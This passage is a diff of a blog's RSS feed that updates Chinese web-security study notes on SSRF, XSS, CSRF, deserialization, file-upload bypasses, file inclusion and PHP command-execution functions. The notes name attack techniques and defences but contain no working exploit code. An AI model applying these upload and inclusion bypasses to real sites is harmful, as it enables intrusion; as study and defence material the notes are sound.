 &lt;li&gt;限制为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt; 域名时，采用 http 基本身份认证的方式绕过，即 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tQHd3dy54eGMuY29t&#34;&gt;http://www.xxx.com@www.xxc.com&lt;/span&gt;，在对 @解析域名中，不同的处理函数存在处理差异&lt;/li&gt;
 &lt;/ol&gt;
+&lt;h3 id=&#34;源码中的危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源码中的危险函数&#34;&gt;#&lt;/a&gt; 源码中的危险函数&lt;/h3&gt;
+&lt;p&gt;file_get_contents，fsockopen，curl_exec，fopen，readfile。&lt;/p&gt;
 &lt;h2 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h2&gt;
 &lt;h3 id=&#34;原理-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-3&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
 &lt;p&gt;web 页面插入恶意 Js 代码，浏览器解析执行获取用户 cookie。&lt;/p&gt;
@@ -743,8 +914,10 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;h3 id=&#34;原理-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-4&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
 &lt;p&gt;指利用受害者尚未失效的身份认证信息、（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（转账，改密码等）。&lt;/p&gt;
 &lt;h3 id=&#34;方法-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-4&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
-&lt;p&gt;1.GET 型：直接改 URL 就好&lt;br /&gt;
- 2.POST 型：想办法利用用户数据提交表单&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;GET 型：直接改 URL 就好&lt;/li&gt;
+&lt;li&gt;POST 型：想办法利用用户数据提交表单&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h3 id=&#34;防御-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-3&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;校验 token：让请求带上一个额外的 csrf_token，来确保请求是通过网站的前端页面发送的。这个 csrf_token 由服务器颁发，不要放到 cookie 里，要通过其他方式提供给网站的前端页面，一种方式是放到 DOM 上。前端请求时就会从 DOM 找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/li&gt;
@@ -801,17 +974,25 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;li&gt;远程和进程间通信&lt;/li&gt;
 &lt;li&gt;连线协议、Web 服务、消息代理&lt;/li&gt;
 &lt;li&gt;缓存 / 持久性存储区&lt;/li&gt;
-&lt;li&gt;数据库、缓存服务器、文件系统&lt;br /&gt;
- 5.HTTP cookie、HTML 表单参数、API 身份验证令牌&lt;/li&gt;
+&lt;li&gt;数据库、缓存服务器、文件系统&lt;/li&gt;
+&lt;li&gt;HTTP cookie、HTML 表单参数、API 身份验证令牌&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;方法-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-6&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
 &lt;ol&gt;
-&lt;li&gt;在 java 和 php 所构造的 class，存在一些特殊成员，会在特定情况下自动调用，而不用程序主动调用。常见的如：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct ()     创建对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct ()   在销毁对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call ()	在对象中调用一个不可访问方法时，__call () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic ()	在静态上下文中调用一个不可访问方法时调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get ()	读取不可访问属性的值时，__get () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set ()	在给不可访问属性赋值时，__set () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset ()	当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset ()	当对不可访问属性调用 unset () 时，__unset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep ()	serialize () 函数会检查类中是否存在一个魔术方法__sleep () , 如果存在，该方法会鲜卑调用，然后再执行序列化操作 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup ()	unserialize () 会检查是否存在一个 __wakeup () 方法，如果存在会先调用__wakeup 方法，预先准备对象需要的资源 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString ()	__toString（） 方法用于一个类被当成字符串时应增氧回应 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke ()	当尝试以调用函数的方式调用一个对象时，__invoke () 方法会被自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set_state ()	字 PHP 5.1.0 起调用 var_export () 导出类时，此静态 方法会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__clone ()	当复制完成时，如果定义了 __clone 方法，则新创建的对象（复制生成的对象）中的 __clone () 方法会被调用，可用于修改属性的值。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
-2.session 反序列化漏洞&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在 java 和 php 所构造的 class，存在一些特殊成员，会在特定情况下自动调用，而不用程序主动调用。常见的如：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__construct ()     创建对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct ()   在销毁对象时自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call ()	在对象中调用一个不可访问方法时，__call () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic ()	在静态上下文中调用一个不可访问方法时调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get ()	读取不可访问属性的值时，__get () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set ()	在给不可访问属性赋值时，__set () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset ()	当对不可访问属性调用 isset () 或 empty () 时，__isset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset ()	当对不可访问属性调用 unset () 时，__unset () 会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep ()	serialize () 函数会检查类中是否存在一个魔术方法__sleep () , 如果存在，该方法会鲜卑调用，然后再执行序列化操作 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup ()	unserialize () 会检查是否存在一个 __wakeup () 方法，如果存在会先调用__wakeup 方法，预先准备对象需要的资源 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString ()	__toString（） 方法用于一个类被当成字符串时应增氧回应 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke ()	当尝试以调用函数的方式调用一个对象时，__invoke () 方法会被自动调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set_state ()	字 PHP 5.1.0 起调用 var_export () 导出类时，此静态 方法会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__clone ()	当复制完成时，如果定义了 __clone 方法，则新创建的对象（复制生成的对象）中的 __clone () 方法会被调用，可用于修改属性的值。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;session 反序列化漏洞&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;phar 反序列化漏洞&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;pop 链构造：指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;3.phar 反序列化漏洞&lt;/p&gt;
-&lt;p&gt;4.pop 链构造：指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。&lt;/p&gt;
 &lt;h3 id=&#34;防御-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-5&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码&lt;/li&gt;
@@ -826,13 +1007,15 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;ol&gt;
 &lt;li&gt;利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）&lt;/li&gt;
 &lt;li&gt;利用数组对象绕过，如 serialize (array ($a)); a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构)。&lt;/li&gt;
-&lt;li&gt;利用引用进行绕过&lt;br /&gt;
- 4.16 进制绕过字符的过滤&lt;/li&gt;
+&lt;li&gt;利用引用进行绕过&lt;/li&gt;
+&lt;li&gt;16 进制绕过字符的过滤&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;反序列化对象特征&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化对象特征&#34;&gt;#&lt;/a&gt; 反序列化对象特征&lt;/h3&gt;
-&lt;p&gt;1.java 序列化数据特征：序列化文件头，数据 16 进制中以  ac ed 00 05 开头&lt;br /&gt;
- 2.tcp：必有 ac ed 00 05，这个 16 进制流基本上也意味者 java 反序列化的开始&lt;br /&gt;
- 3.http：必有 rO0AB，其实这就是 aced0005 的 base64 编码的结果&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;java 序列化数据特征：序列化文件头，数据 16 进制中以  ac ed 00 05 开头&lt;/li&gt;
+&lt;li&gt;tcp：必有 ac ed 00 05，这个 16 进制流基本上也意味者 java 反序列化的开始&lt;/li&gt;
+&lt;li&gt;http：必有 rO0AB，其实这就是 aced0005 的 base64 编码的结果&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h2&gt;
 &lt;h3 id=&#34;原理-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-7&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
 &lt;p&gt;文件上传漏洞原理是指在有上传功能的系统中，如果没有对用户上传的文件进行有效的检查过滤，那么恶意用户就可以上传包含脚本的文件，如 Webshell，然后通过访问这些文件的方式，来执行服务端命令，从而控制 Web 网站或者服务器的漏洞&lt;/p&gt;
@@ -841,21 +1024,23 @@ IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组
 &lt;h3 id=&#34;方法-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-7&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
 &lt;p&gt;统一写在绕过部分&lt;/p&gt;
 &lt;h3 id=&#34;防御-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-6&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
-&lt;p&gt;1、文件上传的目录设置为不可执行&lt;br /&gt;
- 2、判断文件类型：MIME Type、后缀检查，白名单，黑名单，图片 resize 或压缩&lt;br /&gt;
- 3、使用随机数改写文件名和文件路径&lt;br /&gt;
- 4、单独设置文件服务器的域名&lt;br /&gt;
- 5、使用安全设备防御&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;文件上传的目录设置为不可执行&lt;/li&gt;
+&lt;li&gt;判断文件类型：MIME Type、后缀检查，白名单，黑名单，图片 resize 或压缩&lt;/li&gt;
+&lt;li&gt;使用随机数改写文件名和文件路径&lt;/li&gt;
+&lt;li&gt;单独设置文件服务器的域名&lt;/li&gt;
+&lt;li&gt;使用安全设备防御&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h3 id=&#34;绕过-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-7&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;基于前端 js 的防御：&lt;br /&gt;
-a.burp 抓包修改绕过&lt;br /&gt;
+a. burp 抓包修改绕过&lt;br /&gt;
  b. 禁用指定 js 文件&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;基于后端的防御：&lt;br /&gt;
-a.MEME：抓包修改 content-type&lt;br /&gt;
+a. MEME：抓包修改 content-type&lt;br /&gt;
 b. 基于 body 标识头：二进制添加文件标识&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
@@ -865,24 +1050,24 @@ a. 双写后缀&lt;br /&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;基于后端黑名单：&lt;br /&gt;
-a.fuzz 可上传名单&lt;/p&gt;
+a. fuzz 可上传名单&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;b.htaccess 文件：htaccess 文件是 Apache 服务器中的一个配置文件，全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。攻击者可以上传覆盖.htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。需要注意的是，htaccess 文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess 文件，则会覆盖父目录的.htaccess 效果。&lt;/p&gt;
-&lt;p&gt;c.user.ini 文件：该配置文件同样也是目录的配置文件。.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。&lt;br /&gt;
+&lt;p&gt;b. htaccess 文件：htaccess 文件是 Apache 服务器中的一个配置文件，全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。攻击者可以上传覆盖.htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。需要注意的是，htaccess 文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess 文件，则会覆盖父目录的.htaccess 效果。&lt;/p&gt;
+&lt;p&gt;c. user.ini 文件：该配置文件同样也是目录的配置文件。.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。&lt;br /&gt;
 自 PHP 5.3.0 起，.user.ini 是一个能被动态加载的 ini 文件，此类文件仅被 CGI／FastCGI SAPI 处理。不需要重启服务器中间件，只需要等待 user_ini.cache_ttl 所设置的时间（默认为 300 秒），即可被重新加载.&lt;/p&gt;
 &lt;p&gt;d. 利用存储型 xss，在上传的正常文件中夹杂恶意代码&lt;/p&gt;
-&lt;p&gt;e.soap 协议（简单对象访问协议）：SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一种规范，在 Web Service 中，交换带结构信息。可基于 HTTP 等协议，使用 XML 格式传输，抽象于语言实现、平台和硬件。即多语言包括 PHP、Java、.Net 均可支持。配合 XXE 实现攻击&lt;/p&gt;
+&lt;p&gt;e. soap 协议（简单对象访问协议）：SOAP (Simple Object Access Protocol) 简单对象访问协议是交换数据的一种规范，在 Web Service 中，交换带结构信息。可基于 HTTP 等协议，使用 XML 格式传输，抽象于语言实现、平台和硬件。即多语言包括 PHP、Java、.Net 均可支持。配合 XXE 实现攻击&lt;/p&gt;
 &lt;p&gt;f. 根据系统特性绕过：后缀添加空格，添加点，添加冒号，基于特性被删除（windows）；后缀添加 斜杠 ，基于特性被删除（windows/linux）；后缀添加 NTFS 数据流（::$DATA），基于特性（windows）。&lt;/p&gt;
-&lt;p&gt;g. 利用容器解析特性：在 Apache1.x，2.x 中 Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。因此对于 apache 而言，一个 test.php.qwea 文件依然会将其解析为 php。如果所有的后缀 apache 都不认识，那么就会把该文件当做默认的类型，一般来说默认类型就是 text/plain。在 window 中的认识的后缀都记录在 /apche/conf/mine.types 中，在 Ubuntu 下在 /etc/mime.types；%20%00 空字节代码解析漏洞，例如我们可以请求如下 URI：/test [0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证；但最后请求的是 /test [0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台&lt;/p&gt;
+&lt;p&gt;g. 利用容器解析特性：在 Apache1.x，2.  x 中 Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。因此对于 apache 而言，一个 test.php.qwea 文件依然会将其解析为 php。如果所有的后缀 apache 都不认识，那么就会把该文件当做默认的类型，一般来说默认类型就是 text/plain。在 window 中的认识的后缀都记录在 /apche/conf/mine.types 中，在 Ubuntu 下在 /etc/mime.types；%20%00 空字节代码解析漏洞，例如我们可以请求如下 URI：/test [0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证；但最后请求的是 /test [0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台&lt;/p&gt;
 &lt;p&gt;h. 临时文件上传&lt;/p&gt;
 &lt;p&gt;i. 条件竞争：我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的 php 文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个 shell&lt;/p&gt;
 &lt;p&gt;j. 二次渲染：将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取 webshell。&lt;/p&gt;
 &lt;p&gt;k. 临时文件上传&lt;/p&gt;
 &lt;ol start=&#34;5&#34;&gt;
 &lt;li&gt;基于后端白名单&lt;br /&gt;
- a.htaccess 文件（在 httpd.conf 文件中配置 mod_rewrite 模块开启，同时需要将 AllowOverride None 改为 AllowOverride All）&lt;br /&gt;
-b.html 文件（存储型 xss）&lt;br /&gt;
+ a. htaccess 文件（在 httpd.conf 文件中配置 mod_rewrite 模块开启，同时需要将 AllowOverride None 改为 AllowOverride All）&lt;br /&gt;
+b. html 文件（存储型 xss）&lt;br /&gt;
 c. 利用文件包含漏洞：包含解析存在 webshell 的文件；tomcat ajp 协议任务文件包含；thinkphp 任意文件包含日志 getshell&lt;br /&gt;
 d. 容器解析特征：IIS 目录解析，5.X/6.0 版本，目录名包含.asp、.asa、.cer、.cdx、目录下文件都按照 asp 解析执行（/text.asp/1.jpg）；IIS 文件名解析，5.X/6.0 版本，文件名包含.asp;、.asa;、.cer;、.cdx;、优先按照 asp 解析执行（/1.aps;1.jpg）&lt;br /&gt;
 e. 配置不当：PHP CGI 解析漏洞，php.ini 配置文件 cgi.fix_pathinfo=1，则在（/1.jpg/1.php）和（/1.jpg/.php）中，1.jpg 以 php 来解析&lt;br /&gt;
@@ -895,15 +1080,15 @@ e. 配置不当：PHP CGI 解析漏洞，php.ini 配置文件 cgi.fix_pathinfo=1
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Include：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个 php 文件继续执行。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Require：跟 include 唯一不同的是，当产生错误时候，include 会继续运行而 require 停止运行。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Include_once：这个函数跟 include 函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Require_once：这个函数跟 require 函数作用几乎相同，与 include_once 和 include 类似。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php.ini 配置文件：allow_url_fopen=off 即不可以包含远程文件。php4 存在远程包含 &amp; amp; 本地包含，php5 仅存在本地包含。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;h3 id=&#34;挖掘-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-7&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
 &lt;ol&gt;
-&lt;li&gt;白盒审计&lt;br /&gt;
- 2.url 中存在使用 php 文件作为参数（例如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29tP3VybD1pbmRleC5waHAlRUYlQkMlODk=&#34;&gt;http://example.com?url=index.php）&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;白盒审计&lt;/li&gt;
+&lt;li&gt;url 中存在使用 php 文件作为参数（例如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29tP3VybD1pbmRleC5waHAlRUYlQkMlODk=&#34;&gt;http://example.com?url=index.php）&lt;/span&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;方法-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-8&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;包含日志文件:/var/log/apache2/access.log, /var/log/nginx/access.log&lt;/li&gt;
 &lt;li&gt;包含图片木马&lt;/li&gt;
-&lt;li&gt;包含 session 文件&lt;br /&gt;
- 4.file 协议&lt;/li&gt;
+&lt;li&gt;包含 session 文件&lt;/li&gt;
+&lt;li&gt;file 协议&lt;/li&gt;
 &lt;li&gt;如果是 php 后端，可能存在 php 伪协议&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;防御-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-7&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
@@ -967,6 +1152,16 @@ SSTI 就是服务器端模板注入（Server-Side Template Injection）&lt;br /&
 当前使用的一些框架，比如 python 的 flask，php 的 tp，java 的 spring 等一般都采用成熟的的 MVC 的模式，用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户。&lt;br /&gt;
 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。&lt;/p&gt;
 &lt;p&gt;测试方法：4 4&lt;/p&gt;
+&lt;h1 id=&#34;php-命令执行函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-命令执行函数&#34;&gt;#&lt;/a&gt; PHP 命令执行函数&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;system ()：函数执行有回显，将执行结果输出到页面上。&lt;/li&gt;
+&lt;li&gt;passthru ()：函数执行有回显，将执行结果输出到页面上。&lt;/li&gt;
+&lt;li&gt;exec (): 函数执行无回显，默认返回最后一行结果&lt;/li&gt;
+&lt;li&gt;shell_exec (): 函数执行默认无回显，通过 echo 可将执行结果输出到页面。&lt;/li&gt;
+&lt;li&gt;popen ()：打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。&lt;/li&gt;
+&lt;li&gt;proc_open ()：函数与 Popen 函数类似，但是可以提供双向管道&lt;/li&gt;
+&lt;li&gt;pcntl_exec ()：函数的作用是在当前进程空间执行指定程序&lt;/li&gt;
+&lt;/ol&gt;
  ]]></description>
         </item>
         <item>
@@ -1365,105 +1560,6 @@ HTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;/li&gt;
